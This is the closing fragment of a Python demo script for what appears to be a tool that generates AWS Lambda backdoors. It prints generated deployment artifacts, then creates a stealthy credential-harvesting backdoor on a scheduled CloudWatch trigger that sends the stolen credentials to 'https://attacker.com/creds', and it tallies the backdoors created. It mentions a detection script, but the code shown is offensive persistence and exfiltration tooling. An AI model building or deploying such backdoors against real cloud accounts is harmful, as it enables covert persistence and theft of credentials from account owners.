    print("\n[*] Generated artifacts:")
    print(f"  - Lambda code: {len(artifact['lambda_code'])} bytes")
    print(f"  - Deployment package: {len(artifact['deployment_package_b64'])} bytes (base64)")
    print(f"  - Terraform config: {len(artifact['terraform_config'])} bytes")
    print(f"  - CLI commands: {len(artifact['cli_commands'])} commands")
    
    # Create credential harvester
    print("\n[*] Creating credential harvester backdoor...")
    cred_artifact = engine.create_backdoor(
        trigger_type=LambdaTriggerType.CLOUDWATCH_SCHEDULED,
        payload_type=PayloadType.CREDENTIAL_HARVEST,
        exfil_endpoint="https://attacker.com/creds",
        stealth=True
    )
    
    print(f"[+] Function: {cred_artifact['backdoor'].function_name}")
    
    # Print summary
    summary = engine.get_summary()
    print(f"\n[+] Total backdoors created: {summary['total_backdoors']}")
    
    # Print detection script
    print("\n[*] Detection script generated")
    print("-" * 40)


if __name__ == "__main__":
    demo()
